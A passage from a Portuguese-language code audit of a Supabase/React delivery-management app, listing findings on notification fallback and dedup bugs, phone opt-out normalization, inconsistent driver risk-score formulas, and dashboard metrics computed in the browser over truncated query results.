  supabase/functions/send-notification/index.ts:648-651 `const { data, error } = await supabase .from("alerts_sent") .select("sent_at, recipient") .gte("sent_at", since);` + filtro em memória em :662-665.
  ```
- **Causa raiz:** A comparação de telefone é feita por sufixo em JavaScript (`endsWith` dos 11 últimos dígitos), então a consulta não pode filtrar no banco pelo `recipient` exato e trouxe tudo. Sem `.limit()` e sem índice por `recipient`, o conjunto depende do teto de linhas que o PostgREST aplica: se a janela de 10 minutos tiver mais linhas que esse teto, os envios do motorista podem ficar fora da página lida e o teto subconta.
- **Arquivos:** `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 221
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: O valor de `max-rows` do PostgREST no projeto `iecgydonctmabiijadsf` e o volume de `alerts_sent` por janela de 10 minutos. Sem isso, o ponto do teto de página é hipótese; o excesso de tráfego por envio está confirmado pelo código.

#### B-015 — notification_optouts tem chave primária no telefone cru, mas a consulta compara o telefone normalizado

- **Camada:** Banco — integridade e índices
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Se um cliente pedir para voltar a receber avisos e o administrador apagar o telefone da lista, uma segunda linha do mesmo número em outro formato pode continuar bloqueando — e ninguém entende por que a pessoa segue sem receber nada. Na direção oposta, a lista cresce com duplicatas invisíveis.
- **Evidência:**
  ```
  supabase/migrations/20261123200000_optout_and_tracking_end.sql:15 (PK no telefone cru), :46-56 (normalize_br_phone IMMUTABLE), :58-68 (is_phone_opted_out comparando a expressão); supabase/functions/send-notification/index.ts:568-573 é o único consumidor e só lê.
  ```
- **Causa raiz:** A unicidade foi declarada sobre o valor cru (`phone text PRIMARY KEY`) enquanto a semântica do sistema é o valor normalizado por `normalize_br_phone()`. Como a função é IMMUTABLE (:46), dava para ter criado um índice único funcional sobre `normalize_br_phone(phone)` — não foi criado. Consequência dupla: (a) o mesmo número entra duas vezes em formatos diferentes sem o banco reclamar; (b) a comparação é sobre uma expressão, então nenhum índice atende e toda checagem de descadastro varre a tabela inteira.
- **Arquivos:** `supabase/migrations/20261123200000_optout_and_tracking_end.sql`
- **Etapas do plano:** 197

#### B-036 — Canal de contingência dispara mesmo quando a mensagem já saiu ou foi barrada por opt-out

- **Camada:** Backend — notificação e fila
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O contato que está cadastrado tanto no pedido quanto na configuração recebe o aviso e, logo em seguida, recebe de novo pelo canal de contingência. E quem pediu para sair acaba alcançado pelo mesmo caminho. Custo dobrado e reclamação.
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:839 `anyAttempted = true;` (antes dos dois `return` de :852 e :874) e :951-952 `const needFallback = (anyAttempted && !anySucceeded) || (!anyAttempted); if (needFallback && cfg.fallback_channel) {`; bloco inalcançável hoje por src/pages/AlertConfigurationsPage.tsx:93 `fallback_channel: null,`
  ```
- **Causa raiz:** `anyAttempted` é marcado como "tentou" antes de decidir se realmente vai tentar. Quando o único destinatário da configuração já recebeu pelo laço ad-hoc (dedup de `orderRecipientsDelivered`) ou está em opt-out, o resultado é `anyAttempted=true, anySucceeded=false`, que é exatamente a condição de "tudo falhou" que libera o canal de contingência.
- **Arquivos:** `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 236

#### B-037 — escalate-alerts dispara a mesma escalação uma vez por linha de configuração do tipo, e a escalação não passa por dedup

- **Camada:** Backend — notificação e fila
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Se o operador cadastrar mais de um canal para o mesmo tipo de alerta na tela de configurações, cada escalonamento vira várias mensagens iguais para as mesmas pessoas. Custo de mensagem multiplicado e gente recebendo o mesmo aviso três, quatro vezes.
- **Evidência:**
  ```
  supabase/migrations/20261121193000_fix_escalation_pipeline.sql:39-41 `FROM public.alerts a JOIN public.alert_configurations c ON c.alert_type = a.type AND c.is_enabled = true AND c.escalation_enabled = true` (sem DISTINCT); condição hoje inalcançável por supabase/migrations/20261121193000_fix_escalation_pipeline.sql:21 `('DRIVER_BLOCKED','email','Motorista Bloqueado', true, false, 900, 300),` e src/pages/AlertConfigurationsPage.tsx:88 `escalation_enabled: false,`
  ```
- **Causa raiz:** `alert_configurations` tem `UNIQUE(alert_type, channel)` (migration 20251224143803:264), ou seja, vários registros por tipo são permitidos. O JOIN sem `DISTINCT` devolve uma linha por configuração; o worker invoca `send-notification` uma vez por linha, e cada invocação já envia para todas as configurações do tipo. Como escalação pula o dedup, nada absorve a repetição.
- **Arquivos:** `supabase/migrations/20261121193000_fix_escalation_pipeline.sql`, `supabase/functions/escalate-alerts/index.ts`, `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 237

#### B-043 — bitrix24 aceito como fallback_channel pelo banco cai no ramo 'canal não suportado' do despacho

- **Camada:** Backend — notificação e fila
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Operador que escolher Bitrix24 como canal de contingência na configuração não recebe nada: o sistema registra "canal não suportado" em vez de abrir a tarefa. O alerta que deveria ser salvo pelo plano B se perde.
- **Evidência:**
  ```
  supabase/migrations/20260712221144_f9eda2dc-4805-4cce-b99b-e3d2826ca6cb.sql:25-26 (CHECK aceita bitrix24; única migration do campo); supabase/functions/send-notification/index.ts:346-413 (switch sem case bitrix24 + default) e :958-960 (fallback chama dispatch); bitrix24 tratado só em :916-937. Reachability baixa: src/pages/AlertConfigurationsPage.tsx:93 grava fallback_channel null e nenhuma tela oferece a opção.
  ```
- **Causa raiz:** O Bitrix24 precisa de `bitrix24_user_ids` (números), não de um destinatário em texto, então ficou fora do `dispatch` genérico. O CHECK do banco, porém, continua aceitando `bitrix24` como canal de contingência, e o laço de `fallback_recipients` (:958-960) chama `dispatch`.
- **Arquivos:** `supabase/functions/send-notification/index.ts`, `supabase/migrations/20260712221144_f9eda2dc-4805-4cce-b99b-e3d2826ca6cb.sql`
- **Etapas do plano:** 263

#### B-052 — Deferimento por horário de silêncio perde os destinatários do pedido

- **Camada:** Backend — notificação e fila
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Aviso de aproximação/chegada gerado à noite é guardado para as 7h e, quando sai, não vai mais para o contato da coleta nem da entrega do pedido — vai só para os destinatários fixos da configuração, ou para ninguém. O cliente não é avisado e não há erro em lugar nenhum: a resposta diz "deferred: true".
- **Evidência:**
  ```
  supabase/functions/send-notification/index.ts:223-243 — `payload: { alert_id, type, severity, title, message, order_id, driver_id, metadata, }` (sem `recipients`/`dedup_key`/`skip_dedup`/`channels`); contraponto que limita o impacto: supabase/migrations/20261122130100_geo_foundation.sql:371-383 e supabase/functions/job-worker/index.ts:734-752 entregam os destinatários em `metadata.recipients`, preservado no insert.
  ```
- **Causa raiz:** O payload reenfileirado é remontado campo a campo a partir das variáveis desestruturadas em :142-151, e o campo `recipients` do contrato v2 (supabase/functions/_shared/schemas.ts:74-83) fica fora. Quem chama pelo v2 (corpo com `recipients`) perde a lista inteira; só sobrevive o que estiver em `metadata.recipients` (caminho v1).
- **Arquivos:** `supabase/functions/send-notification/index.ts`
- **Etapas do plano:** 289


## Causa raiz: Número do painel calculado no navegador, sobre uma fatia dos dados e com uma fórmula por tela

Nenhum indicador é calculado no banco. Cada painel baixa as linhas e faz a conta no navegador — e baixa só uma parte, porque o servidor corta a resposta (mil linhas por padrão, dez no caso do total de motoristas, cinquenta na fila de aprovações, duas mil na quota) sem avisar que cortou. Além disso, o mesmo indicador foi reescrito em cada tela com regra própria: pontualidade, tempo médio de entrega, motoristas ativos, faixa de risco e até a nota do motorista têm valores diferentes dependendo de onde você olha, e um dos caminhos conta entrega sem prazo como entrega no prazo. Em termos de negócio: nenhum número do painel pode ser usado para decidir.

**17 achado(s) sob esta causa.**


#### A-042 — "Total de motoristas" do Analytics vem de uma consulta com limit(10) e nunca passa de 10

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O painel informa que a operação tem 10 motoristas, qualquer que seja o tamanho real da frota — e o número contradiz o card "Total Motoristas" da página de Métricas.
- **Evidência:**
  ```
  src/hooks/useAnalyticsData.ts:30 — `supabase.from('drivers').select('id, name, completed_deliveries, rating, success_rate, total_deliveries').order('completed_deliveries', { ascending: false }).limit(10),`; src/hooks/useAnalyticsData.ts:81 — `{ metric: 'Total de motoristas', value: \`${drivers.length}\`, change: 0, trend: 'up' as const },`
  ```
- **Causa raiz:** A mesma consulta serve ao ranking "Top Motoristas" (limitada a 10 por design) e ao indicador de total da frota.
- **Arquivos:** `src/hooks/useAnalyticsData.ts`, `src/pages/AnalyticsDashboardPage.tsx`
- **Etapas do plano:** 081

#### A-052 — Score de risco do motorista: fórmula e faixas divergem do que está documentado, e mais fatores de risco podem BAIXAR o score

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O número de risco que aparece na tela e dispara bloqueio automático não é o que foi combinado, e pode premiar o motorista pior: um motorista com taxa de falha alta E atrasos E nota baixa E cancelamentos pode receber score MENOR do que um que só tem a taxa de falha alta — e escapar do bloqueio.
- **Evidência:**
  ```
  supabase/functions/evaluate-driver/index.ts:264-266 — "const normalizedScore = factors.length > 0 \n    ? Math.min(10, totalScore / factors.length) \n    : 0;"; index.ts:87-96 (WEIGHTS como multiplicadores); index.ts:270-273 (faixas 8/5/3); README.md:117 — "A6[Recência<br/>last_delivery_at]" com W6[15%] em README.md:126.
  ```
- **Causa raiz:** Não há pesos percentuais: são multiplicadores de 1,0 a 4,0 aplicados a pontuações por faixa, e o total é dividido pelo NÚMERO DE FATORES DISPARADOS. Como só entra no divisor o fator que disparou, acrescentar um fator de risco de peso menor dilui o score. Além disso o fator "recência da última entrega" (15% no documento) não existe no código, e existe um fator "CANCELLATIONS" que o documento não prevê; as faixas de corte são 3/5/8 em vez de 2,5/5/7,5.
- **Arquivos:** `supabase/functions/evaluate-driver/index.ts`, `docs/agentes/regras-dominio.md`, `docs/pendencias/_regras-de-negocio.md`, `README.md`
- **Etapas do plano:** 091

#### A-062 — Totais, médias e exportações são calculados no navegador sobre uma página truncada dos dados

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Alta · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quanto mais a operação cresce, mais os números do painel encolhem em relação à realidade, sem nenhum aviso na tela: "Total de Pedidos", "Taxa de Conclusão", "Total Requests" e as exportações passam a descrever só um pedaço do período.
- **Evidência:**
  ```
  src/hooks/useDeliveryMetrics.ts:38-40 (sem limit/order/período) + laço em :57+; src/hooks/useErrorLogs.ts:132-135 e :145; alternativa existente em src/hooks/useCachedStats.ts:135-142,179-187.
  ```
- **Causa raiz:** Cada painel baixa linhas brutas e agrega em JavaScript. Onde há `.limit()`, a conta é sobre a fatia; onde não há, o PostgREST aplica o teto `db.max-rows` (1000 no padrão do Supabase) e devolve uma fatia sem ordenação definida — em useDeliveryMetrics nem `.order()` existe, então o conjunto muda entre recargas.
- **Arquivos:** `src/hooks/useDeliveryMetrics.ts`, `src/hooks/useRateLimiting.ts`, `src/pages/AdminTelemetriaPage.tsx`, `src/hooks/useSLOMetrics.ts`, `src/hooks/useErrorLogs.ts`, `src/hooks/useAdvancedReports.ts`, `src/pages/reports/useReportData.ts`, `src/hooks/useMetrics.ts`, `src/hooks/useDeliveryHeatmapData.ts`
- **Etapas do plano:** 215, 216, 217

#### M-031 — Recalculo de risco no navegador sobrescreve o score da edge com outra matemática e ignora whitelist/blacklist

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** A classificação de risco do motorista muda conforme a tela usada por último. Um motorista barrado pode voltar a aparecer apenas como risco alto, e um motorista de confiança pode aparecer como risco alto sem motivo — é essa nota que decide se ele pode rodar.
- **Evidência:**
  ```
  src/hooks/useIncidents.ts:208 `async function recalculateDriverRiskScore(driverId: string): Promise<void> {`; :237-238 `.from('drivers').select('total_deliveries, completed_deliveries, rating')`; :290-295 `.from('drivers').update({ risk_score: finalScore, risk_level: riskLevel, last_evaluated_at: new Date().toISOString() })`; chamadas em :116, :157, :181, :204. Fonte concorrente: supabase/functions/evaluate-driver/index.ts:733-738 e src/hooks/useApprovalActions.ts:83 e :98.
  ```
- **Causa raiz:** Três caminhos escrevem `drivers.risk_score`/`risk_level` com fórmulas diferentes e sem travamento: a edge (fatores ponderados, WEIGHTS em index.ts:86-95), o recálculo do hook de incidentes (base 5 + experiência + taxa de sucesso + nota + soma de severidades) e as ações de whitelist/blacklist (fixos 0 e 10, useApprovalActions.ts:83 e :98). Como o recálculo do hook só lê entregas/nota, ele não conhece `whitelisted`/`blacklisted`/`status`: criar, editar, resolver ou apagar qualquer incidente de um motorista na blacklist rebaixa o score de 10 para o valor da fórmula do cliente (e sobe de 0 no caso do whitelist), mudando também o `risk_level`.
- **Arquivos:** `src/hooks/useIncidents.ts`, `src/hooks/useApprovalActions.ts`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 110

#### M-041 — A mesma faixa de risco está escrita com cortes diferentes em quatro lugares

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** O mesmo motorista aparece como "crítico" numa tela e só "atenção" na outra, e nenhuma das duas concorda com a regra escrita — o operador perde a confiança na cor do alerta.
- **Evidência:**
  ```
  src/components/approvals/SwipeableApprovalCard.tsx:87 — "const riskLevel = approval.riskScore >= 7 ? 'critical' : approval.riskScore >= 5 ? 'warning' : 'info';" (idem :438); src/components/dashboard/ApprovalQueue.tsx:17-21 — "function getRiskColor(score: number): string {\n  if (score >= 8) return 'text-destructive';\n  if (score >= 6) return 'text-warning';\n  if (score >= 4) return 'text-muted-foreground';"; supabase/functions/evaluate-driver/index.ts:270-272; docs/agentes/regras-dominio.md:29.
  ```
- **Causa raiz:** Os cortes foram copiados à mão em cada componente em vez de virem de uma função única; nenhum deles bate com o documento.
- **Arquivos:** `supabase/functions/evaluate-driver/index.ts`, `src/components/approvals/SwipeableApprovalCard.tsx`, `src/components/dashboard/ApprovalQueue.tsx`, `docs/agentes/regras-dominio.md`
- **Etapas do plano:** 120

#### M-060 — "Tempo médio de entrega" calculado com três denominadores diferentes, um deles subestimando a média

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O tempo médio de entrega aparece menor no Analytics do que nos Relatórios para o mesmo período, e há ainda um "tempo médio de coleta" que é simplesmente 30% do tempo de entrega, não uma medição.
- **Evidência:**
  ```
  src/hooks/useAnalyticsData.ts:69-73 e :79; src/pages/reports/useReportData.ts:93-97,110; src/hooks/useSLAMetrics.ts:98-111,172; src/hooks/useDeliveryMetrics.ts:75,158
  ```
- **Causa raiz:** No Analytics, a soma inclui só pedidos com os dois timestamps mas a divisão usa TODOS os concluídos — cada pedido sem timestamp puxa a média para baixo. Os outros dois hooks dividem pela população correta, e ainda filtram outliers com cortes diferentes (480 min no SLA, 1440 min em useDeliveryMetrics, sem corte no Analytics, que ainda aplica Math.abs e transforma entrega adiantada em atraso).
- **Arquivos:** `src/hooks/useAnalyticsData.ts`, `src/pages/reports/useReportData.ts`, `src/hooks/useSLAMetrics.ts`, `src/hooks/useDeliveryMetrics.ts`
- **Etapas do plano:** 139

#### M-082 — Consultas de negócio sem limite nem paginação: o corte silencioso de 1000 linhas do PostgREST falsifica contagens

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** hipotese · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Conforme a base cresce, as telas de motoristas, incidentes e aprovações passam a mostrar números menores que a realidade, sem aviso — decisões de bloqueio e de risco tomadas sobre contagem errada.
- **Evidência:**
  ```
  src/hooks/useDrivers.ts:48-51 `const { data: incidentCounts, error: incidentError } = await supabase.from('driver_incidents').select('driver_id').eq('resolved', false);` e :57-61 a contagem montada em memória `incidentMap.set(inc.driver_id, count + 1)`; src/hooks/usePendingApprovals.ts:118-124 (`count: 'exact', head: true` para `pending` x `select('risk_score')` sem limite para a média); src/hooks/useActiveAlerts.ts:20 `.limit(20);`
  ```
- **Causa raiz:** Nenhuma dessas consultas usa `.range()`/`.limit()`. O PostgREST corta a resposta no máximo de linhas configurado (1000 por padrão no Supabase) sem erro, e o cliente trata a fatia como conjunto completo: em useDrivers o mapa de incidentes por motorista é montado só com as primeiras linhas (incidentCount menor que o real) e em usePendingApprovals a média de risco sai da fatia enquanto `pending` vem de um count exato. Os hooks que fazem certo estão no mesmo repo: useContacts.ts:30 `.limit(500)`, useActiveAlerts.ts:22 `.limit(20)`, useRecentOrders.ts:41 `.range(from, to)`.
- **Arquivos:** `src/hooks/useDrivers.ts`, `src/hooks/useIncidents.ts`, `src/hooks/usePendingApprovals.ts`, `src/components/map/hooks/useTrackingData.ts`
- **Etapas do plano:** 175, 176, 177
- **HIPÓTESE — NÃO VERIFICADO.** Falta para confirmar: Sem MCP do banco oficial iecgydonctmabiijadsf não dá para ver quantas linhas existem hoje em `drivers`, `driver_incidents` e `active_tracking`, nem o `db-max-rows` do projeto — o defeito é estrutural, o momento em que ele morde depende do volume atual.

#### M-106 — Fila de aprovações é cortada em 50 itens sem paginação enquanto o contador mostra o total

- **Camada:** Hooks e estado — dados de negócio
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Passando de 50 aprovações pendentes, as mais antigas somem da tela e nunca são analisadas, embora o contador continue mostrando que existem — pedidos parados esperando decisão que ninguém consegue abrir.
- **Evidência:**
  ```
  src/hooks/usePendingApprovals.ts:96-98 `.from('driver_approval_queue').select(SELECT_QUERY).eq('status', 'PENDING').order('requested_at', { ascending: false }).limit(50);`; src/hooks/usePendingApprovals.ts:128 `pending: pending.count || 0,`; src/pages/ApprovalsPage.tsx:37 `{ icon: Clock, color: 'warning', value: stats?.pending || pendingApprovals.length, label: 'Pend.', ... }`
  ```
- **Causa raiz:** A lista de pendentes traz no máximo 50 registros, ordenados do mais recente para o mais antigo, e não há `.range()` nem controle de página na origem do dado. O cartão de estatísticas usa `count: 'exact'` e mostra o total verdadeiro. Como a ordenação é decrescente, o que fica de fora são justamente as solicitações mais antigas.
- **Arquivos:** `src/hooks/usePendingApprovals.ts`, `src/pages/ApprovalsPage.tsx`
- **Etapas do plano:** 222

#### M-114 — Cartoes de estatistica da tela de pedidos misturam total geral com contagem da pagina atual

- **Camada:** Interface — fluxo de pedido
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Com 500 pedidos a tela mostra 'Total 500' ao lado de 'Concluidos 7' — numeros que nao fecham e que o dono usa para medir operacao. Os tres cartoes tambem mudam so de virar a pagina.
- **Evidência:**
  ```
  src/pages/OrdersPage.tsx:103-108 (stats), :79-81 (orders/totalCount), :169-172 (rótulos sem escopo); src/hooks/useRecentOrders.ts:8, :29, :42
  ```
- **Causa raiz:** `total` vem do `count: 'exact'` da consulta (todos os pedidos), enquanto os outros tres contam dentro do array da pagina corrente, que tem no maximo 20 itens e muda conforme filtro e paginacao.
- **Arquivos:** `src/pages/OrdersPage.tsx`, `src/hooks/useRecentOrders.ts`
- **Etapas do plano:** 230

#### M-122 — Cartões de estatística das aprovações de senha contam apenas a lista já filtrada — 'Aprovadas' e 'Rejeitadas' ficam sempre em zero

- **Camada:** Interface — administração
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** O painel de reset de senha mostra 'Aprovadas: 0' e 'Rejeitadas: 0' na abertura, mesmo tendo dezenas de casos no histórico. Quem acompanha o volume de pedidos de senha lê um número errado.
- **Evidência:**
  ```
  src/pages/PasswordResetApprovalsPage.tsx:20, :27-35 e :50-54 — conforme citado. Acrescento :99 (`onClick={() => setStatusFilter(s.key)}`), que mostra que os cartões acumulam papel de filtro e de contador.
  ```
- **Causa raiz:** As estatísticas foram derivadas da lista exibida em vez de uma contagem independente. Como o filtro padrão é `"pending"` (:20), a lista só traz pendentes e os contadores de aprovadas/rejeitadas resultam em 0.
- **Arquivos:** `src/pages/PasswordResetApprovalsPage.tsx`
- **Etapas do plano:** 246

#### M-124 — "Motoristas Ativos" conta linhas de rastreamento e de cache, não motoristas distintos

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Três telas dão três números diferentes para "motoristas ativos", e o do Dashboard SLA infla conforme os pedidos simultâneos — o dono não consegue saber quantas pessoas estão realmente rodando.
- **Evidência:**
  ```
  src/hooks/useSLAMetrics.ts:54-56,175; supabase/migrations/20251224143803_3b1f0374-1b95-4fba-a31b-f44a9fd14494.sql:190; supabase/migrations/20261123200000_optout_and_tracking_end.sql:89-94; src/hooks/useCachedStats.ts:99,265; src/pages/CacheStatusPage.tsx:206; src/pages/reports/useReportData.ts:104
  ```
- **Causa raiz:** active_tracking é única por PEDIDO, não por motorista: um motorista com dois pedidos em curso conta duas vezes. Em CacheStatusPage, "ativos" é quem já entregou alguma vez (sobre no máximo 100 linhas da view, limit em useCachedStats.ts:99). Só useReportData usa Set de driver_id.
- **Arquivos:** `src/hooks/useSLAMetrics.ts`, `src/hooks/useCachedStats.ts`, `src/pages/reports/useReportData.ts`, `src/pages/SLADashboardPage.tsx`, `src/pages/CacheStatusPage.tsx`
- **Etapas do plano:** 248

#### M-125 — "Pedidos (7d)" do Cache Status são as 7 linhas mais recentes da view, que podem abranger meses

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
- **Impacto no negócio:** O resumo de performance mostra como "últimos 7 dias" um total que pode somar um mês inteiro, e a taxa de conclusão exibida ao lado é calculada sobre esse mesmo recorte elástico.
- **Evidência:**
  ```
  src/hooks/useCachedStats.ts:269-272 (`last7Days: data.deliveryMetrics.slice(0, 7), totalOrders: ...slice(0, 7).reduce(...)`), :66 (`useDeliveryMetricsCache(30)`), :141-145 (`.gte('delivery_date', startDateISO).order('delivery_date', { ascending: false })`); src/pages/CacheStatusPage.tsx:211-213; origem dos buracos: supabase/migrations/20261122090000_*.sql:63-64 (`FROM lalamove_orders lo GROUP BY DATE(lo.created_at)`)
  ```
- **Causa raiz:** A materialized view só tem linha para dias com movimento; `slice(0,7)` pega as sete linhas mais recentes, não os últimos sete dias. Numa operação com folgas, essas sete linhas podem cobrir semanas.
- **Arquivos:** `src/hooks/useCachedStats.ts`, `src/pages/CacheStatusPage.tsx`
- **Etapas do plano:** 249

#### M-128 — Rate Limiting: "Total Requests" conta linhas de log (teto 500) ignorando request_count, e o gráfico "Últimas 24 horas" são os últimos 24 registros

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Média · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Num ataque ou pico, o painel de proteção mostra no máximo 500 requisições e um gráfico rotulado "últimas 24 horas" que pode cobrir só os últimos minutos — exatamente quando o dono precisa dimensionar o volume.
- **Evidência:**
  ```
  src/hooks/useRateLimiting.ts:51-55 (sem filtro de tempo, `.limit(500)`) e :88-93; src/pages/RateLimitDashboardPage.tsx:70-74, :164-165, :232-233, :248-254; supabase/migrations/20251231115949_817e6539-79a0-43fd-98e6-e7bb705cf1b2.sql:48 (`request_count INTEGER DEFAULT 1`, sem escritor no repo)
  ```
- **Causa raiz:** Cada linha de rate_limit_logs agrega várias requisições em `request_count`; o KPI conta linhas e o gráfico lê `request_count` — duas definições de "requests" na mesma tela. E o recorte do gráfico é por quantidade de linhas (24), não por tempo.
- **Arquivos:** `src/hooks/useRateLimiting.ts`, `src/pages/RateLimitDashboardPage.tsx`
- **Etapas do plano:** 252

#### B-008 — Formatadores de moeda e data reescritos à mão em 12 lugares, com a moeda fixada em BRL em uma das cópias

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Os painéis de métrica mostram todo valor como R$ mesmo quando o pedido foi cotado em outra moeda, enquanto o cartão do pedido mostra a moeda certa — dois números diferentes para o mesmo pedido. E a data aparece em formatos diferentes de tela para tela.
- **Evidência:**
  ```
  src/hooks/useCachedStats.ts:317-322 define e exporta `formatCurrency(value)` com `currency: 'BRL'` fixo, mas nenhum arquivo importa esse símbolo (único import do módulo: src/pages/CacheStatusPage.tsx:16 `import { useCachedStats, useDashboardSummary } from "@/hooks/useCachedStats"`), então é código morto. As três cópias vivas (src/components/orders/OrderDetailModal.tsx:437, src/components/dashboard/OrdersTable.tsx:71, src/pages/orders/OrderCard.tsx:35) são idênticas e recebem a moeda do dado (`order.currency`, usos em OrderDetailModal.tsx:837, OrdersTable.tsx:152/295/397, OrderCard.tsx:131).
  ```
- **Causa raiz:** Não existe um módulo de formatação compartilhado em src/lib/ (há src/lib/uapiFormat.ts só para centavos da UAPI e src/lib/statusPalette.ts para cores), então cada tela escreveu a sua.
- **Arquivos:** `src/hooks/useCachedStats.ts`, `src/components/orders/OrderDetailModal.tsx`, `src/components/dashboard/OrdersTable.tsx`, `src/pages/orders/OrderCard.tsx`, `src/components/admin/telemetry/ContractVersionUsagePanel.tsx`, `src/components/health/CronJobsHealthPanel.tsx`, `src/pages/ProfilePage.tsx`, `src/pages/JobQueuePage.tsx`, `src/pages/Bitrix24Page.tsx`, `src/pages/bitrix24/Bitrix24SubComponents.tsx`
- **Etapas do plano:** 163

#### B-010 — Painel de quota da Lalamove subnotifica chamadas sem avisar: a janela de 24 h é cortada em 2000 linhas

- **Camada:** Regras de negócio — cálculos
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 1 revisor(es) independente(s)
- **Impacto no negócio:** Em dia de movimento alto — justamente quando a quota da Lalamove importa — o painel de consumo mostra um número menor do que o real e dá a impressão de folga que não existe.
- **Evidência:**
  ```
  src/hooks/useLalamoveQuota.ts:52-58 — "const since = new Date(Date.now() - HOURS_LOOKBACK * 3600 * 1000).toISOString();\n      const { data, error } = await supabase\n        .from('lalamove_rate_limits')\n        .select('*')\n        .gte('created_at', since)\n        .order('created_at', { ascending: false })\n        .limit(2000);"; src/hooks/useLalamoveQuota.ts:69 — "const totalCalls = rows.length;"; src/pages/LalamoveQuotaPage.tsx:110-112 — "label=\"Chamadas (24h)\"\n          value={summary.totalCalls.toLocaleString('pt-BR')}\n          hint=\"Total registrado em janela\"".
  ```
- **Causa raiz:** A contagem é feita no cliente sobre uma página de no máximo 2000 registros, em vez de um count agregado no banco; passando desse volume o painel passa a mostrar sempre o teto, sem nenhuma indicação de corte. Pelo mesmo motivo, "chamadas críticas" e as estatísticas por endpoint também ficam limitadas às 2000 mais recentes.
- **Arquivos:** `src/hooks/useLalamoveQuota.ts`, `src/pages/LalamoveQuotaPage.tsx`
- **Etapas do plano:** 165

#### B-025 — Cálculo de risco de motorista duplicado: cópia morta no front com pesos diferentes da que roda de verdade na edge evaluate-driver

- **Camada:** Transversal — código morto e duplicação
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 2 revisor(es) independente(s)
- **Impacto no negócio:** Quem for ajustar a régua de risco dos motoristas tem duas tabelas de peso no projeto, com números diferentes, e a mais fácil de achar (no front, com nomes em português) é a que não vale nada. Ajuste feito ali não muda nenhuma aprovação, e o dono acha que mudou.
- **Evidência:**
  ```
  src/hooks/useDriverEvaluations.ts:194-288 (pesos 1.5/2) vs supabase/functions/evaluate-driver/index.ts:86-95 (WEIGHTS); 0 importadores do arquivo em src/ e e2e/; o acesso real é src/hooks/useEvaluateDriver.ts, consumido em src/components/orders/OrderDetailModal.tsx:468.
  ```
- **Causa raiz:** A pontuação de risco foi reimplementada na edge (com fatores que o front não tem — LOW_RATING, FIRST_DELIVERY, CRITICAL_INCIDENTS separado) e a versão do front ficou no repo sem ser removida. src/hooks/useEvaluateDriver.ts:58 é quem chama a edge de verdade.
- **Arquivos:** `src/hooks/useDriverEvaluations.ts`, `src/hooks/useEvaluateDriver.ts`, `supabase/functions/evaluate-driver/index.ts`
- **Etapas do plano:** 207

#### B-049 — Mesma nota de motorista aparece como 5,0 em uma tela e 0,0 em outra

- **Camada:** Interface — painéis e relatórios
- **Severidade:** Baixa · **Confiança:** confirmado · **Modo:** RASTREADO · **Revisão:** relido e confirmado por 3 revisor(es) independente(s)
